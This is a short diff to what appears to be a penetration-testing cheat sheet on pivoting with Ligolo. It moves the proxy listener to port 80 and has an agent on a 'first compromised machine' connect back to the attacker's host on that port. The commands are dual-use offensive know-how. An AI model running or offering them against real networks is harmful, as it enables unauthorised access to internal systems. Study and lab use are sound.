@@ -7,13 +7,13 @@
 Create Interface
 
 ```
-ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert
+ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert -laddr 0.0.0.0:80
 ```
 
 Run Ligolo Agent on First Compromised Machine
 
 ```
-./agent -connect 10.10.10.10:11601 -ignore-cert
+./agent -connect 10.10.10.10:80 -ignore-cert
 ```
 
 Create Tunnel on Ligolo
